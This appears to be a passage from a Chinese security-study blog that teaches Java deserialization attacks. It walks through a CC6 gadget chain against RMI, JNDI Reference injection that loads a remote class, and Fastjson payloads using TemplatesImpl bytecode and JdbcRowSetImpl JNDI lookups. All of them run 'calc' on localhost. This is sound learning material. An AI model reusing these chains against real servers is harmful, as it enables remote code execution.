+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">NeedOb</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;<span class="comment">//创建远程对象接口,这里要继承Remote</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span> <span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NeedObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">NeedOb</span>&#123;<span class="comment">//接口实现类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NeedObject</span><span class="params">()</span> <span class="keyword">throws</span>  RemoteException&#123;&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">NeedObject</span> <span class="variable">needObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NeedObject</span>();<span class="comment">//初始化远程对象（在这里其实就可以使用了,只不过不知道端口号）</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;needObject&quot;</span>,needObject);<span class="comment">//绑定needObject对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Client端代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">NeedOb</span> <span class="variable">needObject2</span> <span class="operator">=</span> (NeedOb) registry.lookup(<span class="string">&quot;needObject&quot;</span>);</span><br><span class="line">        System.out.println(needObject2.sayhello());<span class="comment">//调用sayhello方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果输出：</p>
+<p><img src="image-20230328170900218.png" alt="image-20230328170900218"></p>
+<p>通讯过程：</p>
+<ol>
+<li>客户端通过lookup()方法查找远程对象的引用。这个过程需要指定要查找的远程对象的URL地址（包括主机名、注册表名称和对象名称）。</li>
+<li>客户端调用远程对象的方法。这个过程和调用本地对象的方法类似,客户端并不知道这个对象在运行时是否在本地,也不知道对象实现的细节。</li>
+<li>客户端请求经过网络传输到服务端。这个过程涉及到数据的编码和解码,通过<code>Java序列化机制</code>将对象转换成字节数组进行传输。</li>
+<li>服务端收到请求,根据请求参数调用相应的方法,并将结果返回给客户端。这个过程同样需要涉及数据的编码和解码。</li>
+<li>服务端的响应经过网络传输到客户端,客户端接收响应并将返回值转换成本地对象。</li>
+</ol>
+<h1 id="序列化利用">序列化利用</h1>
+<p>仅通过上述代码是很难进行利用的,但我们从传输的过程可以发现客户端在调用远程对象方法的时候,传输的参数有一个<code>先在客户端序列化,然后在服务端反序列化</code>的过程,所以我们就可以利用这个过程实现反序列化的利用,这里以CC6为例。</p>
+<p>条件：远程调用方法允许传入<code>Object对象</code>&amp;服务端<code>有commons-collections的依赖</code></p>
+<p>我们首先把sayhello方法修改成可传入Object对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NeedObject</span>  <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">NeedOb</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NeedObject</span><span class="params">()</span> <span class="keyword">throws</span>  RemoteException&#123;&#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在服务端添加commons-collections依赖</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>客户端修改poc：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">hashMap.remove(<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//以上是cc6的利用链生成</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line"><span class="type">NeedOb</span> <span class="variable">needObject</span> <span class="operator">=</span> (NeedOb) registry.lookup(<span class="string">&quot;needObject&quot;</span>);</span><br><span class="line">needObject.sayhello(hashMap);<span class="comment">//传入反序列化对象</span></span><br></pre></td></tr></table></figure>
+<p>命令执行成功！！！</p>
+<p><img src="image-20230328194847154.png" alt="image-20230328194847154"></p>
+<h1 id="RMI-JNDI">RMI+JNDI</h1>
+<p>JNDI（Java 命名和目录接口）是 Java 平台提供的一组 API,用于查找和访问命名和目录服务。它可以让 Java  应用程序在运行时动态地查找和使用各种资源,如数据库连接、邮件服务器、JMS 消息队列等。通过 JNDI,Java  应用程序可以在不同的环境中进行配置和部署,而无需修改代码。</p>
+<p><img src="image-20230329202416845.png" alt="image-20230329202416845"></p>
+<p>JNDI支持很多协议,其中就包括RMI协议</p>
+<p>以下是一段利用jndi调用远程对象的客户端实例代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//创建JNDI上下文</span></span><br><span class="line"><span class="type">NeedOb</span> <span class="variable">needObject</span> <span class="operator">=</span> (NeedOb) context.lookup(<span class="string">&quot;rmi://localhost:1099/needObject&quot;</span>);</span><br><span class="line">context.lookup(<span class="string">&quot;rmi://localhost:1099/needObject&quot;</span>);</span><br><span class="line">System.out.println(needObject.sayhello(<span class="string">&quot;111&quot;</span>));</span><br></pre></td></tr></table></figure>
+<p>运行后将会直接调用远程对象的sayhello方法</p>
+<p>之前我们是利用客户端去攻击服务端,而RMI+JNDI可以利用服务端去攻击客户端,当客户端lookup里的参数可控时,我们构造以下服务端代码来执行任意命令：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Test&quot;</span>,<span class="string">&quot;Test&quot;</span>,<span class="string">&quot;http://127.0.0.1:7777/&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;needObject&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对应的Test类：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先启动服务程序,然后在Test.class文件位置用<code>python -m http.server 7777</code>在本地7777端口开一个http服务</p>
+<p>启动客户端发现命令被执行</p>
+<p><img src="image-20230329205341513.png" alt="image-20230329205341513"></p>
+<p>这段代码的重点在于Reference reference  = new Reference(“Test”,“Test”,“<a href="http://127.0.0.1:7777/">http://127.0.0.1:7777/</a>”);</p>
+<p>在Java的JNDI（Java命名和目录接口）中,Reference类用于表示对远程或本地资源的引用,例如Web服务、JDBC数据源等。Reference对象通常包含了一些元数据信息,如引用类型、名称、位置、认证信息等。</p>
+<p>Reference(String className, String factoryClassName, String location)是Reference类的一个构造方法,传入的三个参数分别为类名、工厂类名、URL地址</p>
+<p>因为<code>Reference</code>没有实现<code>Remote</code>接口也没有继承<code>UnicastRemoteObject</code>类,故不能作为远程对象bind到注册中心,所以需要使用<code>ReferenceWrapper</code>对<code>Reference</code>的实例进行一个封装。</p>
+<p>当客户端运行代码的时候会去http://127.0.0.1:7777寻找Test类同时调用其构造方法,于是就触发了构造方法中的命令</p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java反序列化之fastjson</title>
+    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/</url>
+    <content><![CDATA[<h1 id="FastJson-1-2-22-1-2-24">FastJson 1.2.22 - 1.2.24</h1>
+<p><code>fastjson</code>是java反序列化中一个经典的漏洞了,早些在使用java写爬虫程序的时候就用过这个库,今天就针对其反序列化漏洞再来学习一次。</p>
+<p>首先先介绍一下JavaBean ，<code>JavaBean</code> 包括一个默认的<code>构造函数</code>、<code>私有的成员变量</code>以及<code>公共的 getter 和 setter 方法</code>。这些方法用于对类中的属性进行读取和赋值操作,并且可以通过反射机制对其进行访问。</p>
+<p>JavaBean 类通常被用作数据传输对象（DTO）或持久化对象（POJO）,并且经常与 Web 应用程序框架（如 Spring MVC）一起使用。通过将数据映射到 JavaBean 对象中,我们可以方便地进行数据绑定、表单验证以及数据库访问等操作。</p>
+<p>以下是一个简单的 JavaBean 类示例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge被调用了&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName被调用了&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge被调用了&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName被调用了&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>示例代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">21</span>,<span class="string">&quot;1y0ng&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(stringobject);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> JSON.parseObject(stringobject,Person.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出结果：</p>
+<p><img src="image-20230410210446299.png" alt="image-20230410210446299"></p>
+<p>可见在fastjson在序列化的时候会调用JavaBean对象中对应参数的<code>get方法</code>,而在反序列化的时候会调用相应的<code>set方法</code>（要指定反序列化对象）,但我们如何选择反序列化后生成对象是谁呢？</p>
+<p>fastjson给了我们一个<code>@type</code>用来指定反序列化后生成的对象：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;:\&quot;age\&quot;:21,\&quot;name\&quot;:\&quot;1y0ng\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parseObject(stringobject));</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230410215040668.png" alt="image-20230410215040668"></p>
+<blockquote>
+<p>注:这里如果只是以下函数是不会触发get和set方法的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:21,\&quot;name\&quot;:\&quot;1y0ng\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parseObject(stringobject));</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="结合cc3">结合cc3</h2>
+<p>之前在学cc3和shiro的CB链的时候用到了<code>TemplatesImpl类</code>的<code>getOutputProperties方法</code>,刚好这就是get方法,所以我们这里这里可以试试这种方法的利用</p>
+<p>首先将字节数组以<code>base64字符串</code>的形式输出</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(codes));</span><br></pre></td></tr></table></figure>
+<p>然后放入到json字符串中得到poc：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMcnVudGltZTsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAxydW50aW1lLmphdmEMAAkACgcALgwALwAwAQAEY2FsYwwAMQAyAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAMwAKAQAHcnVudGltZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFQANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAMAAkADwAMAA0ADQAOABEAEAANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>测试：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66v……;</span></span><br><span class="line"><span class="string">JSON.parseObject(stringobject,Feature.SupportNonPublicField);</span></span><br></pre></td></tr></table></figure>
+<p><img src="image-20230410223538055.png" alt="image-20230410223538055"></p>
+<p>其中,<code>Feature.SupportNonPublicField</code> 是 Fastjson 库中的一个选项,用于控制是否支持序列化和反序列化非公共字段。如果将该选项设置为 <code>true</code>,则 Fastjson 将尝试序列化和反序列化所有字段,包括私有字段和受保护字段。由于这里TemplatesImpl类的属性全都是private,所以需要设置第二个参数为<code>Feature.SupportNonPublicField</code></p>
+<p>​</p>
+<h2 id="基于JdbcRowSetImpl的jndi注入">基于JdbcRowSetImpl的jndi注入</h2>
+<p>要想利用cc3有很多的局限性,所以我们还可以通过jndi注入执行命令</p>
+<p><code>com.sun.rowset.JdbcRowSetImpl</code>这个类为我们提供了条件,其中的<code>connect()</code>方法为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get a JDBC connection.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// First check for Connection handle object as such if</span></span><br><span class="line">    <span class="comment">// &quot;this&quot; initialized  using conn.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Connect using JNDI.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup<span class="comment">//这里可以尝试jndi注入</span></span><br><span class="line">                (getDataSourceName());</span><br><span class="line">            <span class="comment">//return ds.getConnection(getUsername(),getPassword());</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(getUsername() != <span class="literal">null</span> &amp;&amp; !getUsername().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                 <span class="keyword">return</span> ds.getConnection(getUsername(),getPassword());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (javax.naming.NamingException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getUrl() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Check only for getUrl() != null because</span></span><br><span class="line">        <span class="comment">// user, passwd can be null</span></span><br><span class="line">        <span class="comment">// Connect using the driver manager.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection</span><br><span class="line">                (getUrl(), getUsername(), getPassword());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来发现connect()方法被<code>setAutoCommit方法</code>调用了</p>
+<p><img src="image-20230411161822971.png" alt="image-20230411161822971"></p>
+<p><img src="image-20230411195545182.png" alt="image-20230411195545182"></p>
+<p>这里刚好是一个set方法,可以被fastjson反序列化调用</p>
+<p>这里推荐一个工具——<a href="https://www.yaklang.io">yakit</a></p>
+<p>开启反连服务器</p>
+<p><img src="image-20230411163548141.png" alt="image-20230411163548141"></p>
+<p>设置JavaPayLoad</p>
+<p><img src="image-20230411163755158.png" alt="image-20230411163755158"></p>
+<p>构造poc（网上有人说这里autoCommit必须为true,但我测试下来true和false都可以）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8085/hDEqCUyW&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>命令执行成功<img src="image-20230411163909090.png" alt="image-20230411163909090"></p>
+<h1 id="FastJson-1-2-47">FastJson &lt;1.2.47</h1>
+<p>在1.2.24版本之后,fastjson引入了一个<code>checkAutotype函数</code>,通过黑白名单的方式来检查反序列化是否安全,如果能正常返回clazz的话就会加载并实例化clazz类</p>
+<p><img src="image-20230411174550334.png" alt="image-20230411174550334"></p>
+<p>判断的流程有些复杂,但还是存在可以绕过的情况。在checkAutotype函数中首先会进行一个黑白名单判断,如果传入的类既不在白名单里又不在黑名单里,那么就会对缓存中存在的类进行判断,如果能够在缓存中找到这个类,就返回这个类的clazz,主要代码如下：</p>
